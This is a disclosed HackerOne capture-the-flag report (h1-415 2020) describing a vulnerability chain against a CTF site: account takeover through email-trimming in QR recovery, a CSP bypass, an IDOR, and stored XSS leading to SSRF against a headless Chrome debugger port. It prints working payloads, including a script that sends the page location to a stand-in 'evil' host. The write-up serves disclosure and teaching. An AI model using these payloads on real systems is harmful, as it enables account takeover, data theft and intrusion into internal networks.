---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - vuln/ssrf
  - impact/account-takeover
  - fix/csp
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2020-02-03
submitted: 2020-01-23T06:00:34.450Z
bounty_usd: null
votes: 11
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "checkm50"
source: "https://hackerone.com/reports/781281"
title: "[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources"
---
# [h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 11 | **Program:** h1-ctf | **Disclosed:** 2020-02-03

- Report: [https://hackerone.com/reports/781281](https://hackerone.com/reports/781281)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2020-01-23T06:00:34.450Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Note:
**Please read this report as "An attacker taking over a customer's account" and not as "helping Jobert recovering his document" :)**

## Summary:
Chaining following issues let's an attacker access sensitive information,
1. Exposure of customer email and regex logic error leading to account takeover
2. CSP bypass leading to arbitrary script execution on support portal and forced browsing
3. Exposure of internal host name
4. Insufficient authorization control allowing attacker to update other user's details
5. Stored XSS + SSRF leading to port scanning and access to internal resources

## Steps To Reproduce:
1. Regex logic error leading to account takeover - jobert@mydocz.cosmic email exposed in source code
   1a. 'jobert@mydocz.cosmic' seems to be a customer of MyDocz and the system does not allow any new registration with same email ID
   1b. Turn BurpSuite intercept on and capture following request,
         https://h1-415.h1ctf.com/register
   1c. Modify the email ID parameter as 'jobert@mydocz.cosmic<' , the flaw here is the QR code generation process trims following symbols 
         {<>}
   1d. Now after registration, save the QR code that the system generates
   1e. Logout of the application and navigate to https://h1-415.h1ctf.com/recover
   1f. Select the QR code saved previously and **now you have become jobert@mydocz.cosmic**

2. CSP bypass leading to arbitrary script execution on support portal and forced browsing
     2a. Support portal is vulnerable to HTML injection. One can bypass CSP rules like this
     https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js
     2b. This triggers script execution on support portal but it is self-xss
     2c. Now right click on firefox/chrome and run following function,
           showReviewModal()
     2d. Rating 1 star makes the support agent review the chat logs and hence the script can be executed on agent's client
     2e. With a crafted script like below (Same as the script on 40.js), an attacker and gain information about the URL that the support agent 
      is using,
      ```loc = document.location
      var img1 = document.createElement('img');
      img1.src = 'http://evil/image.png?loc='+loc
      document.body.appendChild(img1);```

3. Exposure of internal host name and user agent
    3a. After performing step 2e, the attacker can now see the internal URL that the agent is using,
    https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd
    3b. Attacker can change the 'localhost:3000' to 'h1-415.h1ctf.com' in order to access the chat page that the support agent is viewing
 

4. Insufficient authorization control allowing attacker to update other user's details,
For further attack we need two accounts. We already have one, an attacker can also create trial account. **We will refer to this account as second account**
    4a. As you can see, the review page from step 3a. contains an option to update user details
    4b. Attacker can now update second account's "name" field, using following POST call,
          https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd
          name=<inject-here>&email=jobert%40mydocz.cosmic&username=jobert&user_id=<second account user_id>&_csrf_token=987d

5. Stored XSS + SSRF leading to port scanning and access to internal resources
     5a. From step 4b, we know that an attacker has to ability to update account information of another user
     5b. This becomes worst because the attacker is also able to inject script like below
     name=<script src='external.com/some.js'>&email=jobert%40mydocz.cosmic&username=jobert&user_id=6&_csrf_token=987d
     5c. An attacker can use this to inject an iframe like below and escalate the situation to SSRF (Port scanning and access internal resource)
     name=<iframe src='http://localhost:9222/json' width=900 height=900></iframe>
     5d. 9222 port because the user-agent says that it is headless chrome hence 9222 which is the debugger port
     5e. the /json end point reveals a secret document

The secret document contains,
## h1ctf{y3s_1m_c0sm1c_n0w}

## Supporting Material/References:
1. Support-portal.png
2. chat-review-page.png
3. external-interaction-ssrftest.png
4. user-update-ssrf.png
5. The-FLAG.png

Special thanks to @pirateducky, @almadjus and @mcipekci  :)

##Remediation:
Hire me :)

## Impact

An attacker is able to, 
achieve **take over of customers account**, 
**compromise the integrity** of the platform by updating other user accounts
**Infiltrate into internal network**
resulting in **Critical** impact

## Timeline

- **Report Filed**
- **2020-01-23** @checkm50: Could you please add @almadjus as collaborator?
- **Report Triaged**
- **2020-01-23** @checkm50: Thanks a lot Ben :)
The name is al-madjus
- **2020-01-23** @nahamsec: Hey there,

Just a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. 

Thanks!
- **2020-01-24** @checkm50: Hi @nahamsec ,
A gentle reminder to add @al-madjus :)
- **2020-01-27** @checkm50: hi @nahamsec ,
A gentle reminder to add @al-madjus :)
- **2020-01-31** @nahamsec: Hi @checkm50 - Apologies for not having the collaboration feature enabled for this CTF. I'll make a note of it and make sure we enable it for all of our CTFs moving forward. I'm going to go ahead and add @al-madjus right now.
- **External User Joined**
- **2020-01-31** @checkm50: Thanks a lot @nahamsec :)
Welcome @al-madjus :)
- **2020-01-31** @al-madjus: Thanks for adding me :-)
- **2020-01-31** @nahamsec: You're welcome! Sorry we didn't get to it earlier.
- **2020-01-31** @nahamsec: Hello Hackers! 

I just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Title Updated**
